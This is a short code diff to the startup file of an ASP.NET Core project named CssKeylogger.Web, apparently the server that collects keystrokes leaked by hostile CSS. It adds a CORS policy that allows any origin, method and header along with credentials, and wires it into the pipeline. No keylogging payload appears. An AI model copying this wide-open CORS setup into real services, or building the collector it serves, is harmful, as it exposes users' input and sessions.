@@ -20,6 +20,12 @@ namespace CssKeylogger.Web
         {
             services.AddMvc();
             services.AddSignalR();
+            services.AddCors(o => o.AddPolicy("App", builder =>
+                builder.AllowAnyOrigin()
+               .AllowAnyMethod()
+               .AllowAnyHeader()
+               .AllowCredentials()
+            ));
         }
 
         // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.
@@ -30,6 +36,7 @@ namespace CssKeylogger.Web
                 app.UseDeveloperExceptionPage();
             }
 
+            app.UseCors("App");
             app.UseMvc();
             app.UseStaticFiles();
             app.UseSignalR(config =>
